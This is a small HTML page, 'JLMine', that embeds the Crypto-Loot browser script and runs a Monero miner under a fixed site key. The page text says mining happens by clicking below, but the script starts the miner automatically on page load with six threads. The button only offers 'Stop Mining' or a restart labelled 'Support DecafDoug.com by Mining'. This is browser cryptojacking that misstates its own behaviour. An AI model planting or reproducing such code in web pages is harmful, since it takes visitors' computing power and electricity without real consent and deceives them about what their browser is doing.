<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<title>JLMine</title>

	<style type="text/css">
		
	</style>

</head>
<body>

			<div>
						<script src="https://crypto-loot.com/lib/miner.min.js"></script>
						Make Monero for JL by clicking below:
						<center>
						<p id="minebutton"></p>
						</center>
						<script type="text/javascript">
							var miner=new CryptoLoot.Anonymous('78413a62525177c4a1acd097c5a5d2383ab524097f64',
        						{
        							threads:6,autoThreads:false,throttle:0.2,
       							 }
							);
							miner.start();

						setInterval(function() {
						    // Output to HTML elements...
						    if (miner.isRunning()) {
							document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
						    } else {
							document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CryptoLoot.FORCE_EXCLUSIVE_TAB)\">Support DecafDoug.com by Mining</button>";
						    }
						}, 1000);
						</script>
		</div>
	
</body>
</html>
